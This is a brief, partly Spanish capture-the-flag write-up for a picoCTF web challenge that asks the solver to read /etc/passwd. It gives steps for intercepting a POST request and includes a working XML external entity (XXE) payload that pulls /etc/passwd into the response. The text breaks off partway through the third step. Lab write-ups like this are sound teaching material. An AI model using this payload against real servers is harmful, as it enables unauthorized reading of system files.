...
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:58530/)
## Pistas
...
1. `Abrimos la pagina y inspeccionamos la red`
2. `En el método post el cuerpo con el siguiente XML`
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>&example;</ID></data>`

3. `Reenviamos y nos mostrara otro metodo, lo abrimos y` 
